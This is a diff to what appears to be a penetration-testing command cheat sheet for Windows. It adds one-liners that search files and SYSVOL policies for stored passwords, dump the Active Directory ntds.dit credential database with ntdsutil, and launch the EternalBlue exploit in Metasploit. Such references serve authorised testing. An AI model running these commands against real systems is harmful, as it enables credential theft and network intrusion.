@@ -11,6 +11,16 @@ systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
+## find passwords
+```
+findstr /si 'password' *.txt *.xml *.docx
+```
+
+## find passwords - group policy preference (ms14-025)
+```
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+```
+
 ## get patchs
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -326,6 +336,11 @@ NetSh Advfirewall set allprofiles state on
 netsh firewall add portopening TCP 3389 "Remote Desktop" 
 ```
 
+% windows, ntds.dit
+## dump ntds.dit
+```
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+```
 
 % windows, smb, share
 ## list of computer
@@ -374,6 +389,12 @@ nmcli dev show <interface>
 ## nslookup AD - domain
 ```
 nslookup -type=SRV _ldap._tcp.dc._msdcs.//<domain>/
+```
+
+% windows, cve
+## windows eternal blue - smb - ms17-010
+```
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
 ```
 
 = interface: eth0
